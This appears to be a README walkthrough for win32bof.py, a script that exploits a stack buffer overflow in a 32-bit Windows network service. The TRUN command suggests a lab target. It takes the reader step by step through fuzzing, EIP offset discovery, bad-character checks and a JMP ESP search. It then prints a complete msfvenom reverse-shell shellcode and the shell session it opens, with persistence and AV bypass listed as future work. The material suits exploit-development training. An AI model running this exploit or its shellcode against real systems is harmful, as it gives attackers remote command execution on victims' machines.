# **Win32 Buffer Overflow Walkthrough**

## **General**

The purpose of the main script **win32bof.py** is to conduct a simple BOF on a 32 bits Windows machine, where the shellcode is directly accessible through **ESP** register! **Only in this case!** Otherwise, scripts in **tools/** directory will be useful for making custom payloads.

## **Step 1:** Trigger an overflow

* Edit **EXPLOIT** function in order to inject the right variable:
```
# -------------- EXPLOIT --------------
def EXPLOIT(sock, buffer):
    sock.recv(size=1024)
    cmd = b'TRUN .' + buffer
    sock.send(cmd)
# ------------ END EXPLOIT ------------
```

* Fuzz the target:
```
# python3 win32bof.py fuzz -t 192.168.56.104 -p 9999
[*] ----------- FUZZ -----------
[*] [192.168.56.104:9999] Connecting... Available!
[*] [192.168.56.104:9999] Connecting... Received 51 bytes Sent 206 bytes: b'TRUN .AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...' Closed
[*] [192.168.56.104:9999] Connecting... Received 51 bytes Sent 406 bytes: b'TRUN .AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...' Closed
[*] [192.168.56.104:9999] Connecting... Received 51 bytes Sent 606 bytes: b'TRUN .AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...' Closed
[*] [192.168.56.104:9999] Connecting... Received 51 bytes Sent 806 bytes: b'TRUN .AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...' Closed
[*] [192.168.56.104:9999] Connecting... Received 51 bytes Sent 1006 bytes: b'TRUN .AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...' Closed
[*] [192.168.56.104:9999] Connecting... Received 51 bytes Sent 1206 bytes: b'TRUN .AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...' Closed
[*] [192.168.56.104:9999] Connecting... Received 51 bytes Sent 1406 bytes: b'TRUN .AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...' Closed
[*] [192.168.56.104:9999] Connecting... Received 51 bytes Sent 1606 bytes: b'TRUN .AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...' Closed
[*] [192.168.56.104:9999] Connecting... Received 51 bytes Sent 1806 bytes: b'TRUN .AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...' Closed
[*] [192.168.56.104:9999] Connecting... Received 51 bytes Sent 2006 bytes: b'TRUN .AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...' Closed
[*] [192.168.56.104:9999] Connecting... Received 51 bytes Sent 2206 bytes: b'TRUN .AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...' Closed
[*] [192.168.56.104:9999] Connecting...Crashed!
[*] [192.168.56.104:9999] Fuzzing crashed at 2200 bytes
```

* The remote service crash with a buffer greater than **2200 bytes**!

## **Step 2:** Get EIP location

* Get the exact offset in order to overwrite **EIP** register. Generate a pattern with metasploit, whose length depends on the value got before:
```
# python3 win32bof.py offset -t 192.168.56.104 -p 9999 --pattern-length 2200
[*] ----------- OFFSET -----------
[*] [192.168.56.104:9999] Connecting... Available!
[*] Executing: /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2200
[*] Pattern generated: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2C
[*] [192.168.56.104:9999] Connecting... Received 51 bytes Sent 2207 bytes: b'TRUN .Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab...' Closed
[*] [192.168.56.104:9999] Remote service always alive? Try to connect...
[*] [192.168.56.104:9999] Crash occured!
[!] (enter eip value found on the victim host): 396F4338
[*] Executing: /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 396F4338 -l 2200
[*] [192.168.56.104:9999] Offset found! >> 2006 <<
```

* Offset was found: **2006 bytes**!

## **Step 3:** Check EIP and confirm length of shellcode

* Check the offset found by replacing **EIP** value with **42424242** on the victim host:
```
# python3 win32bof.py check -t 192.168.56.104 -p 9999 --offset 2006
[*] ----------- CHECK -----------
[*] [192.168.56.104:9999] Connecting... Available!
[*] [192.168.56.104:9999] Connecting... Received 51 bytes Sent 2616 bytes: b'TRUN .AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...' Closed
[*] [192.168.56.104:9999] Remote service always alive? Try to connect...
[*] [192.168.56.104:9999] Crash occured! Check EIP value, it should be 42424242 on the victim host
```

## **STEP 4:** Find a register where we can put a shellcode

* Check where **eax**, **ebx**, **ecx** and **esp** are pointing.
* Check how much space is available for your shellcode (shellcode size > 300 bytes!).
* **WARNING**: if your shellcode is not accessible directly through **esp** register, you have to make some manual modifications during the next steps! Check **Step further** section!

## **Step 5:** Find bad chars

* Send bytes in ascending order to detect bad characters. **Run multiple times** this line, **by adding new bad chars** found.
* You can paste an hex dump to look for bad chars quickly.
```
# python3 win32bof.py badchars -t 192.168.56.104 -p 9999 --offset 2006 --bad-chars 0x00
[*] ----------- BADCHARS -----------
[*] [192.168.56.104:9999] Connecting... Available!
[*] [192.168.56.104:9999] Connecting... Received 51 bytes Sent 2399 bytes: b'TRUN .AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...' Closed
[*] [192.168.56.104:9999] Remote service always alive? Try to connect...
[*] [192.168.56.104:9999] Crash occured! Check EIP value, it should be 42424242 on the victim host
[!] (Right click on ESP value. Click 'Follow in Dump'. Then, copy/paste hex dump)
[!] (Right click on hex selection. Binary -> Binary Copy.)
paste here and i will parse it...
^C[*] CTRL-C Exiting...
```

## **Step 6:** Find JMP ESP (or PUSH ESP RETN)

* If the shellcode is accessible by the register **esp**, just **jump** on **esp**:
```
# /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
nasm > JMP ESP
00000000  FFE4              jmp esp
```

* On victim host, find this opcode (**FFE4**) in a memory space where there are **No DEP, NX, ASLR && No Bad Char in address**:
```
!mona modules
!mona find -s "\xff\xe4" -m <MODULE>.dll -cpb "\x0a"
```

* Once done, the instruction address of **JMP ESP** will replace **EIP** value!

## **Step 7:** Exploit

* Set up a netcat listener:
```
# nc -lvp 4444
listening on [any] 4444 ...
```

* Run the exploit:
```
# python3 win32bof.py exploit -t 192.168.56.104 -p 9999 --offset 2006 -eip 0x625011af --bad-chars 0x00 --local-host 192.168.56.103 --local-port 4444
[*] ----------- EXPLOIT -----------
[*] [192.168.56.104:9999] Connecting... Available!
[*] Executing: msfvenom -p windows/shell_reverse_tcp EXITFUNC=thread LHOST=192.168.56.103 LPORT=4444 -f py -e x86/shikata_ga_nai -b "\x00\x00"
buf =  b""
buf += b"\xbd\x43\xa5\xa0\x9d\xd9\xec\xd9\x74\x24\xf4\x5a\x33"
buf += b"\xc9\xb1\x52\x31\x6a\x12\x03\x6a\x12\x83\xa9\x59\x42"
buf += b"\x68\xd1\x4a\x01\x93\x29\x8b\x66\x1d\xcc\xba\xa6\x79"
buf += b"\x85\xed\x16\x09\xcb\x01\xdc\x5f\xff\x92\x90\x77\xf0"
buf += b"\x13\x1e\xae\x3f\xa3\x33\x92\x5e\x27\x4e\xc7\x80\x16"
buf += b"\x81\x1a\xc1\x5f\xfc\xd7\x93\x08\x8a\x4a\x03\x3c\xc6"
buf += b"\x56\xa8\x0e\xc6\xde\x4d\xc6\xe9\xcf\xc0\x5c\xb0\xcf"
buf += b"\xe3\xb1\xc8\x59\xfb\xd6\xf5\x10\x70\x2c\x81\xa2\x50"
buf += b"\x7c\x6a\x08\x9d\xb0\x99\x50\xda\x77\x42\x27\x12\x84"
buf += b"\xff\x30\xe1\xf6\xdb\xb5\xf1\x51\xaf\x6e\xdd\x60\x7c"
buf += b"\xe8\x96\x6f\xc9\x7e\xf0\x73\xcc\x53\x8b\x88\x45\x52"
buf += b"\x5b\x19\x1d\x71\x7f\x41\xc5\x18\x26\x2f\xa8\x25\x38"
buf += b"\x90\x15\x80\x33\x3d\x41\xb9\x1e\x2a\xa6\xf0\xa0\xaa"
buf += b"\xa0\x83\xd3\x98\x6f\x38\x7b\x91\xf8\xe6\x7c\xd6\xd2"
buf += b"\x5f\x12\x29\xdd\x9f\x3b\xee\x89\xcf\x53\xc7\xb1\x9b"
buf += b"\xa3\xe8\x67\x0b\xf3\x46\xd8\xec\xa3\x26\x88\x84\xa9"
buf += b"\xa8\xf7\xb5\xd2\x62\x90\x5c\x29\xe5\x5f\x08\x09\x92"
buf += b"\x37\x4b\x69\x4d\x94\xc2\x8f\x07\x34\x83\x18\xb0\xad"
buf += b"\x8e\xd2\x21\x31\x05\x9f\x62\xb9\xaa\x60\x2c\x4a\xc6"
buf += b"\x72\xd9\xba\x9d\x28\x4c\xc4\x0b\x44\x12\x57\xd0\x94"
buf += b"\x5d\x44\x4f\xc3\x0a\xba\x86\x81\xa6\xe5\x30\xb7\x3a"
buf += b"\x73\x7a\x73\xe1\x40\x85\x7a\x64\xfc\xa1\x6c\xb0\xfd"
buf += b"\xed\xd8\x6c\xa8\xbb\xb6\xca\x02\x0a\x60\x85\xf9\xc4"
buf += b"\xe4\x50\x32\xd7\x72\x5d\x1f\xa1\x9a\xec\xf6\xf4\xa5"
buf += b"\xc1\x9e\xf0\xde\x3f\x3f\xfe\x35\x84\x5f\x1d\x9f\xf1"
buf += b"\xf7\xb8\x4a\xb8\x95\x3a\xa1\xff\xa3\xb8\x43\x80\x57"
buf += b"\xa0\x26\x85\x1c\x66\xdb\xf7\x0d\x03\xdb\xa4\x2e\x06"
[*] Shellcode generated: 351 bytes
[!] Set up a listener: `nc -lvp 4444`. Press [ENTER] once done!

[*] [192.168.56.104:9999] Connecting... Received 51 bytes Sent 2383 bytes: b'TRUN .AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...' Closed
[*] [192.168.56.104:9999] Payload Sent! Got a shell ?!
```

* Enjoy your shell!
```
listening on [any] 4444 ...
192.168.56.104: inverse host lookup failed: Unknown host
connect to [192.168.56.103] from (UNKNOWN) [192.168.56.104] 49670
Microsoft Windows [version 10.0.10577]
(c) 2015 Microsoft Corporation. Tous droits r�serv�s.

C:\Users\WINDOWS_10\Desktop>
```

## **Step further:** what if we can't have the shellcode at the beginning of **esp** register?

In this case, payloads will need custom modifications.

* Goal: find a register whose value can be controlled!

Some simple scripts are available in **tools/** directory and can be easily modified:
* **1. fuzz.py**: fuzz a vulnerable input.
* **2. get_offset.py**: help to get EIP register offset.
* **3. increase_buffer_length.py**: help to identify the space avalaible **OR** the register where you can put the shellocde.
* **4. find_bad_chars.py**: help to find bad characters on the victim host.
* **5. exploit.py**: send the malicious shellcode in order to get a reverse shell.

# TODO

## Persistence

## AV Bypass